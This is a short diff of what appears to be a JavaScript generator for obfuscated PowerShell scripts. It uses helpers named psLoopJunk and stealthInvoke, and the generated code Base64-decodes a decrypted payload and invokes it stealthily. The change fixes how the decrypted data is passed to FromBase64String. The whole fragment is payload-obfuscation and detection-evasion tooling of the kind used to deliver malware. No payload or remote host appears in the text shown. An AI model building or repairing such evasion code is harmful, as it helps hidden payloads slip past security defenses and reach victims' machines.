@@ -383,7 +383,7 @@ ${psLoopJunk(iv)}
     return [System.Text.Encoding]::ASCII.GetString($${rv})
 }
 
-${stealthInvoke(`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${kv}))`)}
+${stealthInvoke(`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($(${fv} $${dv} $${kv})))`)}
 `
 }
 
@@ -457,6 +457,6 @@ ${psLoopJunk('i')}
     return $${rv}
 }
 
-${stealthInvoke(`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${nv}))`)}
+${stealthInvoke(`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($(${fv} $${dv} $${nv})))`)}
 `
 }
